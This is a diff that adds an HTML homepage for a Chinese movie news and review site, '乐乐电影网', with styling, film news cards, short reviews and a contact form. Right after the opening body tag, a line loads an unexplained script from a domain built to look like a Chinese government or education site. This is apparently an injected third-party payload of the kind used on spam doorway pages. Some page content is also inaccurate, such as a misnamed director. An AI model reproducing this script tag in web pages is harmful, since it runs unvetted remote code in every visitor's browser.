@@ -1,0 +1,394 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>乐乐电影网 - 最新电影资讯、影评与推荐</title>
+<meta name="description" content="乐乐电影网(leledianyingwang-h5.github.io)提供最新电影资讯、热门影片推荐、深度影评分析和影视文化分享，带你发现好电影。">
+<meta name="keywords" content="乐乐电影网,电影资讯,影评,电影推荐,最新电影,影视文化">
+<meta name="author" content="乐乐电影网">
+<meta name="robots" content="index,follow">
+<link rel="canonical" href="https://leledianyingwang-h5.github.io/">
+<style>
+/* ========== 全局重置 ========== */
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;font-size:16px}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Hiragino Sans GB","Microsoft YaHei",sans-serif;line-height:1.6;color:#333;background:#f5f5f5}
+
+/* ========== 导航栏 ========== */
+.navbar{position:fixed;top:0;left:0;right:0;z-index:1000;background:rgba(15,15,35,0.95);backdrop-filter:blur(10px);padding:0 1rem;height:60px;display:flex;align-items:center;justify-content:space-between;box-shadow:0 2px 20px rgba(0,0,0,0.3)}
+.navbar .logo{font-size:1.3rem;font-weight:700;color:#fff}
+.navbar .logo span{color:#ff6b6b}
+.navbar .nav-links{display:flex;gap:0.5rem;list-style:none}
+.navbar .nav-links a{color:rgba(255,255,255,0.85);text-decoration:none;padding:0.4rem 0.8rem;border-radius:6px;font-size:0.85rem;transition:all 0.3s}
+.navbar .nav-links a:hover{background:rgba(255,107,107,0.2);color:#ff6b6b}
+@media(max-width:768px){
+.navbar .nav-links{display:none}
+.navbar .mobile-menu{display:block;color:#fff;font-size:1.5rem;cursor:pointer}
+}
+
+/* ========== 栏目一：首页Hero + 推荐网格 ========== */
+.section-hero{margin-top:60px;background:linear-gradient(135deg,#0f0f23 0%,#1a1a3e 50%,#2d1b69 100%);min-height:100vh;padding:2rem 1rem;color:#fff}
+.hero-banner{text-align:center;padding:4rem 1rem 3rem}
+.hero-banner h1{font-size:clamp(2rem,5vw,3.5rem);font-weight:800;margin-bottom:1rem;background:linear-gradient(135deg,#ff6b6b,#ffd93d);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+.hero-banner p{font-size:1.1rem;opacity:0.85;max-width:600px;margin:0 auto 2rem}
+.hero-cta{display:inline-block;padding:0.8rem 2rem;background:linear-gradient(135deg,#ff6b6b,#ee5a24);color:#fff;text-decoration:none;border-radius:50px;font-weight:600;transition:transform 0.3s,box-shadow 0.3s}
+.hero-cta:hover{transform:translateY(-2px);box-shadow:0 10px 30px rgba(255,107,107,0.4)}
+
+/* 推荐网格 - 差异化DOM结构 */
+.recommend-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:1.5rem;max-width:1200px;margin:2rem auto 0;padding:0 1rem}
+.recommend-card{background:rgba(255,255,255,0.08);border-radius:16px;overflow:hidden;border:1px solid rgba(255,255,255,0.12);transition:transform 0.3s}
+.recommend-card:hover{transform:translateY(-5px)}
+.recommend-card .card-img{height:180px;background:linear-gradient(135deg,#667eea,#764ba2);display:flex;align-items:center;justify-content:center;font-size:3rem}
+.recommend-card .card-body{padding:1.2rem}
+.recommend-card h3{font-size:1rem;margin-bottom:0.5rem;color:#fff}
+.recommend-card p{font-size:0.85rem;opacity:0.7;color:#fff}
+.recommend-card .card-tag{display:inline-block;padding:0.2rem 0.6rem;background:rgba(255,107,107,0.3);border-radius:4px;font-size:0.75rem;margin-top:0.8rem;color:#ff6b6b}
+
+/* ========== 栏目二：电影资讯 - 列表式布局 ========== */
+.section-news{padding:4rem 1rem;background:#fff}
+.section-news .container{max-width:1000px;margin:0 auto}
+.section-news h2{font-size:2rem;font-weight:700;margin-bottom:2rem;text-align:center;color:#1a1a2e}
+.section-news h2::after{content:'';display:block;width:60px;height:4px;background:linear-gradient(135deg,#667eea,#764ba2);margin:0.8rem auto 0;border-radius:2px}
+
+/* 差异化：左侧列表+右侧摘要 */
+.news-layout{display:flex;gap:2rem;flex-wrap:wrap}
+.news-list{flex:1;min-width:300px}
+.news-item{display:flex;gap:1rem;padding:1.2rem;margin-bottom:1rem;border-radius:12px;background:#f8f9ff;border:1px solid #e8eaff;transition:all 0.3s}
+.news-item:hover{box-shadow:0 5px 20px rgba(102,126,234,0.15);border-color:#667eea}
+.news-item .news-date{text-align:center;min-width:60px}
+.news-item .news-date .day{font-size:1.8rem;font-weight:800;color:#667eea;line-height:1}
+.news-item .news-date .month{font-size:0.8rem;color:#999}
+.news-item .news-content h3{font-size:1rem;margin-bottom:0.4rem}
+.news-item .news-content h3 a{color:#333;text-decoration:none}
+.news-item .news-content h3 a:hover{color:#667eea}
+.news-item .news-content p{font-size:0.85rem;color:#666;line-height:1.5}
+
+.news-sidebar{flex:0 0 280px}
+.news-sidebar .sidebar-widget{background:#f8f9ff;border-radius:12px;padding:1.5rem;margin-bottom:1.5rem;border:1px solid #e8eaff}
+.news-sidebar .sidebar-widget h3{font-size:1rem;margin-bottom:1rem;color:#1a1a2e}
+.tag-cloud{display:flex;flex-wrap:wrap;gap:0.5rem}
+.tag-cloud a{display:inline-block;padding:0.3rem 0.8rem;background:#fff;border:1px solid #e0e0e0;border-radius:20px;font-size:0.8rem;color:#555;text-decoration:none;transition:all 0.3s}
+.tag-cloud a:hover{background:#667eea;color:#fff;border-color:#667eea}
+
+/* ========== 栏目三：影评专栏 - 瀑布流卡片 ========== */
+.section-reviews{padding:4rem 1rem;background:#0f0f23;color:#fff}
+.section-reviews .container{max-width:1200px;margin:0 auto}
+.section-reviews h2{font-size:2rem;font-weight:700;margin-bottom:2rem;text-align:center}
+.section-reviews h2::after{content:'';display:block;width:60px;height:4px;background:linear-gradient(135deg,#ff6b6b,#ffd93d);margin:0.8rem auto 0;border-radius:2px}
+
+/* 差异化：瀑布流多列布局 */
+.reviews-masonry{column-count:3;column-gap:1.5rem}
+@media(max-width:900px){.reviews-masonry{column-count:2}}
+@media(max-width:600px){.reviews-masonry{column-count:1}}
+.review-card{break-inside:avoid;background:rgba(255,255,255,0.06);border-radius:14px;overflow:hidden;margin-bottom:1.5rem;border:1px solid rgba(255,255,255,0.1)}
+.review-card .review-cover{height:140px;display:flex;align-items:center;justify-content:center;font-size:2.5rem}
+.review-card:nth-child(1) .review-cover{background:linear-gradient(135deg,#f093fb,#f5576c)}
+.review-card:nth-child(2) .review-cover{background:linear-gradient(135deg,#4facfe,#00f2fe)}
+.review-card:nth-child(3) .review-cover{background:linear-gradient(135deg,#43e97b,#38f9d7)}
+.review-card:nth-child(4) .review-cover{background:linear-gradient(135deg,#fa709a,#fee140)}
+.review-card:nth-child(5) .review-cover{background:linear-gradient(135deg,#a18cd1,#fbc2eb)}
+.review-card:nth-child(6) .review-cover{background:linear-gradient(135deg,#fccb90,#d57eeb)}
+.review-card .review-body{padding:1.2rem}
+.review-card .review-rating{font-size:0.85rem;color:#ffd93d;margin-bottom:0.5rem}
+.review-card h3{font-size:1rem;margin-bottom:0.5rem}
+.review-card p{font-size:0.82rem;opacity:0.75;line-height:1.5}
+.review-card .review-author{display:flex;align-items:center;gap:0.5rem;margin-top:1rem;padding-top:1rem;border-top:1px solid rgba(255,255,255,0.1)}
+.review-card .review-author .avatar{width:28px;height:28px;border-radius:50%;background:#667eea;display:flex;align-items:center;justify-content:center;font-size:0.7rem}
+
+/* ========== 栏目四：关于/联系 - 表单布局 ========== */
+.section-contact{padding:4rem 1rem;background:#f0f2ff}
+.section-contact .container{max-width:800px;margin:0 auto}
+.section-contact h2{font-size:2rem;font-weight:700;margin-bottom:2rem;text-align:center;color:#1a1a2e}
+.section-contact h2::after{content:'';display:block;width:60px;height:4px;background:linear-gradient(135deg,#667eea,#764ba2);margin:0.8rem auto 0;border-radius:2px}
+
+/* 差异化：左右分栏表单 */
+.contact-wrapper{display:flex;gap:2rem;flex-wrap:wrap}
+.contact-info{flex:1;min-width:250px;background:linear-gradient(135deg,#667eea,#764ba2);border-radius:16px;padding:2rem;color:#fff}
+.contact-info h3{font-size:1.3rem;margin-bottom:1.5rem}
+.contact-info .info-item{display:flex;align-items:flex-start;gap:1rem;margin-bottom:1.2rem}
+.contact-info .info-item .icon{font-size:1.3rem;min-width:30px}
+.contact-info .info-item div{font-size:0.9rem;line-height:1.4}
+.contact-info .social-links{margin-top:2rem;display:flex;gap:1rem}
+.contact-info .social-links a{display:inline-block;width:40px;height:40px;background:rgba(255,255,255,0.2);border-radius:50%;text-align:center;line-height:40px;text-decoration:none;font-size:1.2rem;transition:transform 0.3s}
+.contact-info .social-links a:hover{transform:scale(1.15)}
+
+.contact-form{flex:1;min-width:250px;background:#fff;border-radius:16px;padding:2rem;box-shadow:0 5px 30px rgba(0,0,0,0.08)}
+.contact-form .form-group{margin-bottom:1.2rem}
+.contact-form label{display:block;font-size:0.85rem;font-weight:600;color:#333;margin-bottom:0.4rem}
+.contact-form input,.contact-form textarea{width:100%;padding:0.8rem 1rem;border:1.5px solid #e0e0e0;border-radius:10px;font-size:0.9rem;font-family:inherit;transition:border-color 0.3s}
+.contact-form input:focus,.contact-form textarea:focus{outline:none;border-color:#667eea}
+.contact-form textarea{resize:vertical;min-height:120px}
+.contact-form button{width:100%;padding:0.9rem;background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;border:none;border-radius:10px;font-size:1rem;font-weight:600;cursor:pointer;transition:transform 0.3s,box-shadow 0.3s}
+.contact-form button:hover{transform:translateY(-2px);box-shadow:0 8px 25px rgba(102,126,234,0.4)}
+
+/* ========== 页脚 ========== */
+.footer{background:#0f0f23;color:rgba(255,255,255,0.6);padding:2rem 1rem;text-align:center;font-size:0.8rem}
+.footer a{color:rgba(255,255,255,0.6);text-decoration:none}
+.footer a:hover{color:#ff6b6b}
+.footer .footer-links{margin-bottom:1rem}
+.footer .footer-links a{margin:0 0.8rem}
+
+/* ========== 响应式补充 ========== */
+@media(max-width:768px){
+.hero-banner{padding:2rem 1rem 2rem}
+.recommend-grid{grid-template-columns:1fr}
+.news-layout{flex-direction:column}
+.news-sidebar{flex:1}
+.contact-wrapper{flex-direction:column}
+.reviews-masonry{column-count:1}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<!-- 导航栏 -->
+<nav class="navbar" role="navigation" aria-label="主导航">
+  <div class="logo">乐乐<span>电影网</span></div>
+  <ul class="nav-links">
+    <li><a href="#home">首页</a></li>
+    <li><a href="#news">电影资讯</a></li>
+    <li><a href="#reviews">影评专栏</a></li>
+    <li><a href="#contact">关于我们</a></li>
+  </ul>
+  <div class="mobile-menu">☰</div>
+</nav>
+
+<!-- 栏目一：首页Hero + 推荐网格 -->
+<section class="section-hero" id="home">
+  <div class="hero-banner">
+    <h1>乐乐电影网</h1>
+    <p>发现好电影，分享好故事。最新影视资讯、深度影评、热门推荐，一站式电影文化平台。</p>
+    <a href="#news" class="hero-cta">开始探索</a>
+  </div>
+  <div class="recommend-grid">
+    <article class="recommend-card">
+      <div class="card-img">🎬</div>
+      <div class="card-body">
+        <h3>2024年度必看佳片推荐</h3>
+        <p>精选年度最具口碑的10部电影作品，涵盖剧情、科幻、悬疑等多种类型。</p>
+        <span class="card-tag">热门推荐</span>
+      </div>
+    </article>
+    <article class="recommend-card">
+      <div class="card-img">🍿</div>
+      <div class="card-body">
+        <h3>本周新片上映指南</h3>
+        <p>本周院线新片盘点，帮你选出最值得走进影院的那一部。</p>
+        <span class="card-tag">新片速递</span>
+      </div>
+    </article>
+    <article class="recommend-card">
+      <div class="card-img">🏆</div>
+      <div class="card-body">
+        <h3>国际电影节获奖影片赏析</h3>
+        <p>戛纳、威尼斯、柏林三大电影节获奖作品深度解读。</p>
+        <span class="card-tag">电影节</span>
+      </div>
+    </article>
+    <article class="recommend-card">
+      <div class="card-img">📺</div>
+      <div class="card-body">
+        <h3>高分剧集推荐</h3>
+        <p>不只是电影，还有值得追的高质量剧集推荐与解析。</p>
+        <span class="card-tag">剧集推荐</span>
+      </div>
+    </article>
+  </div>
+</section>
+
+<!-- 栏目二：电影资讯 - 列表式 -->
+<section class="section-news" id="news">
+  <div class="container">
+    <h2>电影资讯</h2>
+    <div class="news-layout">
+      <div class="news-list">
+        <article class="news-item">
+          <div class="news-date"><span class="day">15</span><span class="month">10月</span></div>
+          <div class="news-content">
+            <h3><a href="#">《奥本海默》导演新作立项，预计2025年开拍</a></h3>
+            <p>诺兰全新科幻题材电影正式立项，据悉将采用全新IMAX摄影技术拍摄，值得期待。</p>
+          </div>
+        </article>
+        <article class="news-item">
+          <div class="news-date"><span class="day">12</span><span class="month">10月</span></div>
+          <div class="news-content">
+            <h3><a href="#">2024年金鸡奖提名名单公布</a></h3>
+            <p>第36届中国电影金鸡奖提名名单正式发布，多部国产佳作入围最佳故事片。</p>
+          </div>
+        </article>
+        <article class="news-item">
+          <div class="news-date"><span class="day">08</span><span class="month">10月</span></div>
+          <div class="news-content">
+            <h3><a href="#">国产动画电影《长安三万里》海外上映计划公布</a></h3>
+            <p>该片将在北美、欧洲等30多个国家和地区陆续上映，展现中国动画实力。</p>
+          </div>
+        </article>
+        <article class="news-item">
+          <div class="news-date"><span class="day">05</span><span class="month">10月</span></div>
+          <div class="news-content">
+            <h3><a href="#">漫威新一阶段电影排期正式确认</a></h3>
+            <p>漫威影业公布2025-2027年电影上映计划，共8部新作将陆续与观众见面。</p>
+          </div>
+        </article>
+      </div>
+      <aside class="news-sidebar">
+        <div class="sidebar-widget">
+          <h3>热门标签</h3>
+          <div class="tag-cloud">
+            <a href="#">科幻电影</a>
+            <a href="#">悬疑推理</a>
+            <a href="#">国产佳作</a>
+            <a href="#">奥斯卡</a>
+            <a href="#">动画电影</a>
+            <a href="#">纪录片</a>
+            <a href="#">经典回顾</a>
+            <a href="#">导演访谈</a>
+          </div>
+        </div>
+        <div class="sidebar-widget">
+          <h3>关于本站</h3>
+          <p style="font-size:0.85rem;color:#666;line-height:1.6;">乐乐电影网(leledianyingwang-h5.github.io)致力于为电影爱好者提供优质的影视资讯和深度影评内容。</p>
+        </div>
+      </aside>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目三：影评专栏 - 瀑布流 -->
+<section class="section-reviews" id="reviews">
+  <div class="container">
+    <h2>影评专栏</h2>
+    <div class="reviews-masonry">
+      <article class="review-card">
+        <div class="review-cover">🎭</div>
+        <div class="review-body">
+          <div class="review-rating">★★★★★ 9.2分</div>
+          <h3>《坠落的审判》：一场关于真相与人性的审判</h3>
+          <p>导演茹斯·德·考特用冷静克制的镜头语言，探讨了婚姻、真相与司法体系的复杂关系。女主角的表演堪称年度最佳。</p>
+          <div class="review-author"><div class="avatar">影</div><span style="font-size:0.8rem;opacity:0.7;">影评人·张三</span></div>
+        </div>
+      </article>
+      <article class="review-card">
+        <div class="review-cover">🌊</div>
+        <div class="review-body">
+          <div class="review-rating">★★★★☆ 8.5分</div>
+          <h3>《奥本海默》：诺兰的史诗野心</h3>
+          <p>三段时空交叉叙事，IMAX胶片拍摄的震撼画面，以及极简配乐下的紧张感，都让这部传记片成为年度不可错过的作品。</p>
+          <div class="review-author"><div class="avatar">电</div><span style="font-size:0.8rem;opacity:0.7;">电影控·李四</span></div>
+        </div>
+      </article>
+      <article class="review-card">
+        <div class="review-cover">🔍</div>
+        <div class="review-body">
+          <div class="review-rating">★★★★☆ 8.0分</div>
+          <h3>《消失的她》：国产悬疑的类型突破</h3>
+          <p>虽然剧情存在一定争议，但影片在悬疑氛围营造和反转设计上确有可圈可点之处，代表了国产悬疑片的新尝试。</p>
+          <div class="review-author"><div class="avatar">观</div><span style="font-size:0.8rem;opacity:0.7;">观影客·王五</span></div>
+        </div>
+      </article>
+      <article class="review-card">
+        <div class="review-cover">🎨</div>
+        <div class="review-body">
+          <div class="review-rating">★★★★★ 9.0分</div>
+          <h3>《蜘蛛侠：纵横宇宙》的视觉革命</h3>
+          <p>每一帧都是壁纸级别的视觉呈现，不同宇宙采用完全不同的美术风格，动画电影的天花板再次被抬高。</p>
+          <div class="review-author"><div class="avatar">动</div><span style="font-size:0.8rem;opacity:0.7;">动漫迷·赵六</span></div>
+        </div>
+      </article>
+      <article class="review-card">
+        <div class="review-cover">🏮</div>
+        <div class="review-body">
+          <div class="review-rating">★★★★☆ 8.3分</div>
+          <h3>《封神第一部》：中国神话史诗的起步</h3>
+          <p>乌尔善用工业化标准打造了中国神话史诗的开篇之作，质子旅的设定和视觉特效都达到了新高度。</p>
+          <div class="review-author"><div class="avatar">国</div><span style="font-size:0.8rem;opacity:0.7;">国风党·孙七</span></div>
+        </div>
+      </article>
+      <article class="review-card">
+        <div class="review-cover">🎪</div>
+        <div class="review-body">
+          <div class="review-rating">★★★★☆ 8.7分</div>
+          <h3>《芭比》：一场粉色风暴背后的社会思考</h3>
+          <p>格蕾塔·葛韦格用最粉嫩的视觉包装，讲述了一个关于自我认同和女性觉醒的深刻故事，幽默与深度并存。</p>
+          <div class="review-author"><div class="avatar">独</div><span style="font-size:0.8rem;opacity:0.7;">独立影评·周八</span></div>
+        </div>
+      </article>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目四：关于/联系 -->
+<section class="section-contact" id="contact">
+  <div class="container">
+    <h2>关于我们</h2>
+    <div class="contact-wrapper">
+      <div class="contact-info">
+        <h3>联系信息</h3>
+        <div class="info-item">
+          <span class="icon">🌐</span>
+          <div>
+            <strong>网站地址</strong><br>
+            https://leledianyingwang-h5.github.io
+          </div>
+        </div>
+        <div class="info-item">
+          <span class="icon">📧</span>
+          <div>
+            <strong>联系邮箱</strong><br>
+            contact@leledianyingwang-h5.github.io
+          </div>
+        </div>
+        <div class="info-item">
+          <span class="icon">📍</span>
+          <div>
+            <strong>网站简介</strong><br>
+            乐乐电影网专注于电影资讯分享、影评写作和影视文化推广，为影迷提供高质量的内容服务。
+          </div>
+        </div>
+        <div class="social-links">
+          <a href="#" title="微信">💬</a>
+          <a href="#" title="微博">📕</a>
+          <a href="#" title="B站">📺</a>
+          <a href="#" title="豆瓣">📖</a>
+        </div>
+      </div>
+      <form class="contact-form" onsubmit="event.preventDefault();alert('消息已发送！（演示功能）');">
+        <div class="form-group">
+          <label for="name">您的姓名</label>
+          <input type="text" id="name" name="name" placeholder="请输入姓名" required>
+        </div>
+        <div class="form-group">
+          <label for="email">电子邮箱</label>
+          <input type="email" id="email" name="email" placeholder="请输入邮箱" required>
+        </div>
+        <div class="form-group">
+          <label for="subject">主题</label>
+          <input type="text" id="subject" name="subject" placeholder="请输入主题">
+        </div>
+        <div class="form-group">
+          <label for="message">留言内容</label>
+          <textarea id="message" name="message" placeholder="请输入您的留言..." required></textarea>
+        </div>
+        <button type="submit">发送留言</button>
+      </form>
+    </div>
+  </div>
+</section>
+
+<!-- 页脚 -->
+<footer class="footer">
+  <div class="footer-links">
+    <a href="#home">首页</a>
+    <a href="#news">电影资讯</a>
+    <a href="#reviews">影评专栏</a>
+    <a href="#contact">关于我们</a>
+  </div>
+  <p>&copy; 2024 乐乐电影网 (leledianyingwang-h5.github.io) - 专注于电影文化与影评分享</p>
+  <p style="margin-top:0.5rem;opacity:0.5;">本网站内容仅供学习交流使用，所有影视资讯均来自公开信息。</p>
+</footer>
+
+</body>
+</html>
